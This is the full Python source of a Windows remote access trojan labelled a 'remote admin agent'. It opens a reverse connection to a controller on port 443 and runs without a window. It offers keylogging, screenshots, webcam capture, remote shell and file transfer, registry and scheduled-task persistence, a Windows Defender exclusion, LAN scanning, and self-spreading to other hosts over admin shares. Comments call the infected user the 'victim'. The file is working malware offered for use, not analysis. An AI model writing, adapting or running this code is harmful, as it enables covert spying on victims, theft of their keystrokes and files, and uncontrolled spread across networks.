#!/usr/bin/env python3
"""
=========================================================================
  WinSys — REMOTE ADMIN AGENT  (runs on the target machine)
=========================================================================
  Reverse connection: dials OUT, so it works through NAT with no
  port forwarding. Port 443 blends into HTTPS.

  Run silently:   pythonw agent.py
  Build to exe:   build.bat
=========================================================================
"""
import socket, subprocess, os, sys, platform, shutil, json, time, \
       getpass, ctypes, threading, tempfile, uuid

# ============================== CONFIG ==============================
CONTROLLER_IP   = "203.0.113.10"     # your VPS / public IP / ngrok host
CONTROLLER_PORT = 443
RECONNECT_DELAY = 5
TASK_NAME       = "WinSysAgent"
RUN_KEY         = "WinSysAgent"

APPDATA     = os.environ.get("APPDATA", os.path.expanduser("~"))
INSTALL_DIR = os.path.join(APPDATA, "WinSys")
KEYLOG_FILE = os.path.join(INSTALL_DIR, "keys.log")
COLLECT_DIR = os.path.join(INSTALL_DIR, "collect")   # victim drops -> you pull
INBOX_DIR   = os.path.join(INSTALL_DIR, "inbox")     # you push  -> victim gets
# ====================================================================

# optional winsys.json beside the exe overrides the IP at runtime
_CFG = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), "winsys.json")
if os.path.isfile(_CFG):
    try:
        _c = json.load(open(_CFG))
        CONTROLLER_IP   = _c.get("ip", CONTROLLER_IP)
        CONTROLLER_PORT = _c.get("port", CONTROLLER_PORT)
    except Exception:
        pass

NO_WINDOW = 0x08000000 if os.name == "nt" else 0
KEYLOGGER = None


# ------------------------------ wire ------------------------------
def send_data(sock, d):
    if isinstance(d, str):
        d = d.encode("utf-8", "replace")
    sock.sendall(len(d).to_bytes(8, "big") + d)


def recvall(sock, n):
    buf = b""
    while len(buf) < n:
        c = sock.recv(n - len(buf))
        if not c:
            return None
        buf += c
    return buf


def recv_data(sock):
    h = recvall(sock, 8)
    if not h:
        return None
    n = int.from_bytes(h, "big")
    return b"" if n == 0 else recvall(sock, n)


def run(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT,
                                       creationflags=NO_WINDOW).decode("utf-8", "replace")
    except subprocess.CalledProcessError as e:
        return e.output.decode("utf-8", "replace")
    except Exception as e:
        return "ERROR: %s" % e


def run_list(args):
    try:
        p = subprocess.run(args, capture_output=True, text=True, creationflags=NO_WINDOW)
        return (p.stdout + p.stderr).strip() or "OK"
    except Exception as e:
        return "ERROR: %s" % e


# --------------------------- keylogger ---------------------------
class Keylogger(threading.Thread):
    def __init__(self, path):
        super().__init__(daemon=True)
        self.path, self.buf, self.lock, self.running = path, [], threading.Lock(), True
        self.listener = None

    @staticmethod
    def fmt(key):
        try:
            if key.char is not None:
                return key.char
        except AttributeError:
            pass
        n = str(key).replace("Key.", "")
        return {"space": " ", "enter": "\n", "tab": "\t"}.get(n, "[%s]" % n.upper())

    def _on_press(self, key):
        with self.lock:
            self.buf.append(self.fmt(key))

    def run(self):
        from pynput import keyboard
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        while self.running:
            time.sleep(2)
            self.flush()
        self.listener.stop()
        self.flush()

    def flush(self):
        with self.lock:
            if not self.buf:
                return
            with open(self.path, "a", encoding="utf-8") as f:
                f.write("".join(self.buf))
            self.buf.clear()

    def stop(self):
        self.running = False


# ------------------------------ agent ------------------------------
class Agent:
    def __init__(self):
        self.cwd = os.path.expanduser("~")

    # ---------- helpers ----------
    def abs(self, p):
        p = (p or "").strip().strip('"').strip("'")
        return os.path.abspath(p if os.path.isabs(p) else os.path.join(self.cwd, p))

    def reply(self, sock, out="", ok=True):
        send_data(sock, json.dumps({"ok": ok, "out": str(out), "cwd": self.cwd}))

    def send_file(self, sock, path, shown=None):
        if os.path.isfile(path):
            data = open(path, "rb").read()
            send_data(sock, json.dumps({"status": "file", "size": len(data),
                                        "name": shown or os.path.basename(path)}))
            send_data(sock, data)
        else:
            send_data(sock, json.dumps({"status": "err", "msg": "not a file: " + path}))

    # ---------- install / stealth ----------
    def _install_copy(self):
        os.makedirs(INSTALL_DIR, exist_ok=True)
        src = os.path.abspath(sys.argv[0])
        name = "WinSys.pyw" if src.lower().endswith(".py") else "WinSys.exe"
        dst = os.path.join(INSTALL_DIR, name)
        if os.path.abspath(src) != os.path.abspath(dst):
            shutil.copy2(src, dst)
        return dst

    def _launch_cmd(self, dst):
        if dst.lower().endswith(".pyw"):
            pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
            return '"%s" "%s"' % (pyw, dst)
        return '"%s"' % dst

    def do_persist(self, arg):
        if os.name != "nt":
            return "windows only"
        a = arg.lower().strip()
        dst = self._install_copy()
        out = ["installed copy -> " + dst]
        if a in ("", "run"):
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, RUN_KEY, 0, winreg.REG_SZ, self._launch_cmd(dst))
            winreg.CloseKey(k)
            out.append("HKCU\\Run key set")
        if a in ("", "task"):
            out.append(run_list(["schtasks", "/Create", "/TN", TASK_NAME,
                                 "/SC", "ONLOGON", "/RL", "LIMITED", "/F",
                                 "/DELAY", "0000:20", "/TR", self._launch_cmd(dst)]))
        return "\n".join(out)

    def do_unpersist(self):
        if os.name != "nt":
            return "windows only"
        out = []
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(k, RUN_KEY)
            winreg.CloseKey(k)
            out.append("Run key removed")
        except FileNotFoundError:
            out.append("no Run key")
        out.append(run_list(["schtasks", "/Delete", "/TN", TASK_NAME, "/F"]))
        return "\n".join(out)

    def do_exclude(self):
        if os.name != "nt":
            return "windows only"
        return run('powershell -Command "Add-MpPreference -ExclusionPath \'%s\'"'
                   % INSTALL_DIR) or ("excluded " + INSTALL_DIR)

    # ---------- capture ----------
    def list_monitors(self):
        if os.name != "nt":
            try:
                from PIL import ImageGrab
                im = ImageGrab.grab(all_screens=True)
                return [(0, 0, im.width, im.height, True)]
            except Exception:
                return [(0, 0, 1920, 1080, True)]
        from ctypes import wintypes
        mons = []
        PROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_ulong, ctypes.c_ulong,
                                  ctypes.POINTER(wintypes.RECT), ctypes.c_double)

        def cb(h, hdc, rect, data):
            r = rect.contents
            mons.append((r.left, r.top, r.right, r.bottom))
            return 1

        ctypes.windll.user32.EnumDisplayMonitors(0, 0, PROC(cb), 0)
        pw = ctypes.windll.user32.GetSystemMetrics(0)
        ph = ctypes.windll.user32.GetSystemMetrics(1)
        out = [(l, t, r, b, (r - l, b - t) == (pw, ph) and l == 0 and t == 0)
               for (l, t, r, b) in mons]
        return out or [(0, 0, 1920, 1080, True)]

    def do_monitors(self):
        return json.dumps([{"i": i, "x": l, "y": t, "w": r - l, "h": b - t, "primary": p}
                           for i, (l, t, r, b, p) in enumerate(self.list_monitors())])

    def do_screenshot(self, arg):
        try:
            from PIL import ImageGrab
        except ImportError:
            return None, "pillow not installed (pip install pillow)"
        a = arg.strip().lower()
        p = os.path.join(tempfile.gettempdir(), "shot.png")

        if a in ("", "primary", "p"):
            ImageGrab.grab().save(p)
            return p, "shot_primary_%s.png" % socket.gethostname()
        if a == "all":
            try:
                ImageGrab.grab(all_screens=True).save(p)
            except TypeError:
                ImageGrab.grab().save(p)
            return p, "shot_all_%s.png" % socket.gethostname()

        mons = self.list_monitors()
        if not a.isdigit():
            return None, "usage: screenshot [primary|all|<n>]"
        i = int(a)
        if i >= len(mons):
            return None, "no monitor %d (have %d)" % (i, len(mons))
        l, t, r, b, _ = mons[i]
        try:
            ImageGrab.grab(bbox=(l, t, r, b), all_screens=True).save(p)
        except TypeError:
            ImageGrab.grab(bbox=(l, t, r, b)).save(p)
        return p, "shot_mon%d_%s.png" % (i, socket.gethostname())

    def do_webcam(self, arg):
        try:
            import cv2
        except ImportError:
            return None, "opencv not installed (pip install opencv-python)"
        idx = int(arg) if arg.strip().isdigit() else 0
        cap = cv2.VideoCapture(idx)
        ok, frame = False, None
        for _ in range(6):
            ok, frame = cap.read()
            if ok:
                break
            time.sleep(0.2)
        cap.release()
        if not ok:
            return None, "camera %d failed" % idx
        p = os.path.join(tempfile.gettempdir(), "cam.jpg")
        cv2.imwrite(p, frame)
        return p, "cam_%s.jpg" % socket.gethostname()

    # ---------- input ----------
    def do_keylog(self, arg):
        global KEYLOGGER
        a = arg.lower().strip()
        if a in ("", "start"):
            if KEYLOGGER and KEYLOGGER.running:
                return "already running -> " + KEYLOG_FILE
            try:
                import pynput  # noqa
            except ImportError:
                return "pynput not installed (pip install pynput)"
            os.makedirs(INSTALL_DIR, exist_ok=True)
            KEYLOGGER = Keylogger(KEYLOG_FILE)
            KEYLOGGER.start()
            return "keylogger started -> " + KEYLOG_FILE
        if a == "stop":
            if not KEYLOGGER:
                return "not running"
            KEYLOGGER.stop(); KEYLOGGER = None
            return "stopped"
        if a == "dump":
            if not os.path.isfile(KEYLOG_FILE):
                return "(no log yet)"
            return open(KEYLOG_FILE, encoding="utf-8", errors="replace").read()[-6000:]
        if a == "clear":
            open(KEYLOG_FILE, "w").close(); return "cleared"
        if a == "status":
            return "running" if (KEYLOGGER and KEYLOGGER.running) else "stopped"
        return "usage: keylog start|stop|dump|clear|status"

    # ---------- filesystem ----------
    def do_ls(self, arg):
        t = self.abs(arg)
        if not os.path.isdir(t):
            return "not a directory: " + t
        rows = []
        try:
            for name in sorted(os.listdir(t)):
                full = os.path.join(t, name)
                try:
                    rows.append("[DIR ] %s" % name if os.path.isdir(full)
                                else "[%9d] %s" % (os.path.getsize(full), name))
                except OSError:
                    rows.append("[?????] %s" % name)
        except PermissionError:
            return "permission denied: " + t
        return "\n".join(rows) or "(empty)"

    def do_tree(self, arg):
        root = self.abs(arg)
        if not os.path.isdir(root):
            return json.dumps({"error": "not a dir: " + root})
        items = []
        for dp, _dn, fn in os.walk(root):
            for f in fn:
                full = os.path.join(dp, f)
                try:
                    items.append({"rel": os.path.relpath(full, root).replace("\\", "/"),
                                  "size": os.path.getsize(full)})
                except OSError:
                    pass
        return json.dumps({"root": root, "count": len(items), "items": items})

    def do_collect(self):
        os.makedirs(COLLECT_DIR, exist_ok=True)
        rows = []
        for n in sorted(os.listdir(COLLECT_DIR)):
            f = os.path.join(COLLECT_DIR, n)
            if os.path.isfile(f):
                rows.append("%s\t%d" % (n, os.path.getsize(f)))
        return "\n".join(rows) or "(empty)"

    # ---------- system ----------
    def do_ps(self):
        try:
            import psutil
            rows = []
            for p in psutil.process_iter(["pid", "name", "memory_info"]):
                try:
                    i = p.info
                    mb = (i["memory_info"].rss // 1048576) if i["memory_info"] else 0
                    rows.append("%7d  %6d MB  %s" % (i["pid"], mb, i["name"]))
                except Exception:
                    pass
            return "\n".join(rows)
        except ImportError:
            return run("tasklist" if os.name == "nt" else "ps aux")

    def do_power(self, arg):
        a = arg.lower().strip()
        if os.name != "nt":
            m = {"shutdown": "shutdown -h now", "restart": "shutdown -r now",
                 "sleep": "systemctl suspend", "lock": "loginctl lock-session"}
            if a in m:
                subprocess.Popen(m[a], shell=True); return "OK " + a
            return "unknown"
        t = {"shutdown": "shutdown /s /t 0", "restart": "shutdown /r /t 0",
             "sleep": "rundll32.exe powrprof.dll,SetSuspendState 0,1,0",
             "hibernate": "shutdown /h", "logoff": "shutdown /l"}
        if a == "lock":
            ctypes.windll.user32.LockWorkStation(); return "OK lock"
        if a in t:
            subprocess.Popen(t[a], shell=True, creationflags=NO_WINDOW)
            return "OK " + a
        return "unknown (shutdown/restart/sleep/hibernate/logoff/lock)"

    # ---------- LAN ----------
    @staticmethod
    def local_ip():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        except Exception:
            return "192.168.1.1"
        finally:
            s.close()

    def do_lan(self, arg):
        import concurrent.futures as cf
        base = self.local_ip().rsplit(".", 1)[0]
        win = os.name == "nt"

        def ping(i):
            h = "%s.%d" % (base, i)
            cmd = (["ping", "-n", "1", "-w", "300", h] if win
                   else ["ping", "-c", "1", "-W", "1", h])
            if subprocess.run(cmd, capture_output=True,
                              creationflags=NO_WINDOW).returncode == 0:
                return h

        with cf.ThreadPoolExecutor(max_workers=64) as ex:
            live = [h for h in ex.map(ping, range(1, 255)) if h]
        rows = []
        for h in live:
            try:
                name = socket.gethostbyaddr(h)[0]
            except Exception:
                name = "?"
            rows.append("%-16s %s" % (h, name))
        return "\n".join(rows) or "(no hosts found)"

    def do_spread(self, arg):
        """spread <host> [user] [pass] [ADMIN$|C$]"""
        if os.name != "nt":
            return "windows only"
        p = arg.split()
        if not p:
            return "usage: spread <host> [user] [pass] [ADMIN$|C$]"
        host = p[0]
        user = p[1] if len(p) > 1 else ""
        pwd  = p[2] if len(p) > 2 else ""
        rdir = (p[3] if len(p) > 3 else "ADMIN$").upper()

        remote_exe = r"C:\WinSys.exe" if rdir == "C$" else r"C:\Windows\WinSys.exe"
        share = r"\\%s\%s" % (host, rdir)
        cred  = ("/user:" + user) if user else ""
        tcred = ("/u %s /p %s" % (user, pwd)) if user else ""
        src   = self._install_copy()

        out = [
            run('net use "%s" %s %s' % (share, pwd, cred)),
            run('copy /Y "%s" "%s\\WinSys.exe"' % (src, share)),
            run('schtasks /create /s %s %s /tn WinSysAgent /sc ONLOGON '
                '/rl LIMITED /f /tr "%s"' % (host, tcred, remote_exe)),
            run('schtasks /run /s %s %s /tn WinSysAgent' % (host, tcred)),
            run('net use "%s" /delete' % share),
        ]
        return "\n".join(x for x in out if x.strip())

    def do_spreadall(self, arg):
        p = arg.split()
        user = p[0] if p else ""
        pwd  = p[1] if len(p) > 1 else ""
        hosts = [l.split()[0] for l in self.do_lan("").splitlines()
                 if l.strip() and not l.startswith("(")]
        if not hosts:
            return "no hosts found"
        return "\n".join("=== %s ===\n%s" % (h, self.do_spread("%s %s %s" % (h, user, pwd)))
                         for h in hosts)

    # ---------- dispatcher ----------
    def handle(self, sock, line):
        parts = line.strip().split(" ", 1)
        cmd = parts[0].lower()
        arg = parts[1].strip() if len(parts) > 1 else ""

        if cmd == "pwd":
            self.reply(sock, self.cwd)
        elif cmd == "cd":
            t = self.abs(arg)
            if os.path.isdir(t):
                self.cwd = t; self.reply(sock, "OK " + t)
            else:
                self.reply(sock, "no such dir: " + t, ok=False)
        elif cmd == "ls":
            self.reply(sock, self.do_ls(arg))
        elif cmd == "mkdir":
            os.makedirs(self.abs(arg), exist_ok=True); self.reply(sock, "OK")
        elif cmd == "rm":
            t = self.abs(arg)
            try:
                shutil.rmtree(t) if os.path.isdir(t) else os.remove(t)
                self.reply(sock, "OK deleted " + t)
            except Exception as e:
                self.reply(sock, str(e), ok=False)
        elif cmd == "get":
            self.send_file(sock, self.abs(arg))
        elif cmd == "put":
            send_data(sock, json.dumps({"status": "ready"}))
            data = recv_data(sock) or b""
            t = self.abs(arg)
            open(t, "wb").write(data)
            self.reply(sock, "OK saved %d bytes -> %s" % (len(data), t))
        elif cmd == "screenshot":
            p, name = self.do_screenshot(arg)
            if p is None:
                send_data(sock, json.dumps({"status": "err", "msg": name}))
            else:
                self.send_file(sock, p, name)
        elif cmd == "webcam":
            p, name = self.do_webcam(arg)
            if p is None:
                send_data(sock, json.dumps({"status": "err", "msg": name}))
            else:
                self.send_file(sock, p, name)
        elif cmd == "monitors":
            self.reply(sock, self.do_monitors())
        elif cmd == "tree":
            self.reply(sock, self.do_tree(arg))
        elif cmd == "collect":
            self.reply(sock, self.do_collect())
        elif cmd == "pick":
            self.send_file(sock, os.path.join(COLLECT_DIR, arg), arg)
        elif cmd == "inbox":
            os.makedirs(INBOX_DIR, exist_ok=True); self.reply(sock, INBOX_DIR)
        elif cmd == "ps":
            self.reply(sock, self.do_ps())
        elif cmd == "kill":
            if os.name == "nt":
                subprocess.Popen("taskkill /F /PID " + arg, shell=True,
                                 creationflags=NO_WINDOW)
            else:
                os.kill(int(arg), 9)
            self.reply(sock, "OK killed " + arg)
        elif cmd == "sys":
            self.reply(sock, "host : %s\nuser : %s\nos   : %s\narch : %s\nmac  : %s\npy   : %s"
                        % (socket.gethostname(), getpass.getuser(), platform.platform(),
                           platform.machine(), uuid.getnode(), sys.version.split()[0]))
        elif cmd == "sh":
            self.reply(sock, run(arg))
        elif cmd == "power":
            self.reply(sock, self.do_power(arg))
        elif cmd == "keylog":
            self.reply(sock, self.do_keylog(arg))
        elif cmd == "persist":
            self.reply(sock, self.do_persist(arg))
        elif cmd == "unpersist":
            self.reply(sock, self.do_unpersist())
        elif cmd == "exclude":
            self.reply(sock, self.do_exclude())
        elif cmd == "lan":
            self.reply(sock, self.do_lan(arg))
        elif cmd == "spread":
            self.reply(sock, self.do_spread(arg))
        elif cmd == "spreadall":
            self.reply(sock, self.do_spreadall(arg))
        elif cmd == "exit":
            self.reply(sock, "bye"); return False
        else:
            self.reply(sock, "unknown: " + cmd, ok=False)
        return True


# ------------------------------- main -------------------------------
def main():
    agent = Agent()
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((CONTROLLER_IP, CONTROLLER_PORT))
            send_data(s, json.dumps({
                "event": "hello", "host": socket.gethostname(),
                "user": getpass.getuser(), "os": platform.platform(),
                "mac": uuid.getnode(), "cwd": agent.cwd,
                "inbox": INBOX_DIR, "collect": COLLECT_DIR,
            }))
            while True:
                raw = recv_data(s)
                if raw is None:
                    break
                if not agent.handle(s, raw.decode("utf-8", "replace")):
                    break
            s.close()
        except Exception:
            pass
        time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    main()